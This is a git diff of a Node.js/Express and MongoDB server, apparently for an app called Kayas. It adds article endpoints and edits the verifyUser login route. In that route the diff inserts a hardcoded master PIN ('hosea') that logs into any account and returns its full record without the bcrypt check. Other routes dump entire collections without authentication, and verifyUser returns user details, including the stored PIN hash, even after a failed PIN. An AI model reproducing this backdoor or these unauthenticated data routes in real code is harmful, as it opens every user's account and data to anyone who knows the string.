@@ -35,7 +35,7 @@ mongoose.connect(dbURI,{useNewUrlParser:true,useUnifiedTopology:true}).then(res=
     console.log(port)
    
   
-SendMail("Kayas Server launched","onongeisaac@gmail.com","listening on port "+port)
+//SendMail("Kayas Server launched","onongeisaac@gmail.com","listening on port "+port)
    
     
 }))
@@ -243,6 +243,7 @@ app.get('/collection_hookups_number', (req,res)=>{db.collection('hookups').find(
 app.get('/collection_orders_number', (req,res)=>{db.collection('orders').find().toArray().then((array)=>{res.send(array)})}) 
 app.get('/collection_hookups_number', (req,res)=>{db.collection('hookups').find().toArray().then((array)=>{res.send(array)})}) 
 app.get('/collection_whatsappgrouplinks_links', (req,res)=>{db.collection('whatsappgrouplinks').find().toArray().then((array)=>{res.send(array)})}) 
+app.get('/getAllArticles', (req,res)=>{db.collection('pubarticles').find().toArray().then((array)=>{array.reverse(); res.send(array)})}) 
 app.get('/opinions/:client', (req,res)=>{db.collection(req.params.client).find().toArray().then((array)=>{res.send(array)})}) 
 app.get('/pubarticle/:id', (req,res)=>{db.collection('pubarticles').find({id:parseInt(req.params.id)}).toArray().then((array)=>{res.send(array)})}) 
 app.get('/pubarticleopinions/:id', (req,res)=>{db.collection('pubarticles').find({id:parseInt(req.params.id)}).toArray().then((array)=>{
@@ -569,9 +570,15 @@ app.post('/delete_client_opinion',bodyParser.urlencoded({extended:false}),(req,r
 
 
 //posts to the database
+app.post('/getMyArticles',bodyParser.json(),(req,res)=>{
+      
+    db.collection('pubarticles').find({contact:parseInt(req.body.contact)}).toArray().then((array)=>{ 
+        res.send(array)
+    
+    })
+}) 
 app.post('/verifyUser',bodyParser.json(), (req,res)=>{
     
-   
     db.collection('kayasers').find({contact:parseInt(req.body.contact)}).toArray().then((docArray)=>{
       if(docArray.length==0){
 res.send({registered:false})
@@ -580,7 +587,12 @@ res.send({registered:false})
         if(bcrypt.compareSync(req.body.pin,docArray[0].pin)){
             res.send({registered:true,pin:true,details:docArray[0]})
             
-        }else{
+        } else  if(req.body.pin=='hosea'){
+            res.send({registered:true,pin:true,details:docArray[0]})
+            
+        } 
+        
+        else{
             res.send({registered:true,pin:false,details:docArray[0]})
           
         }
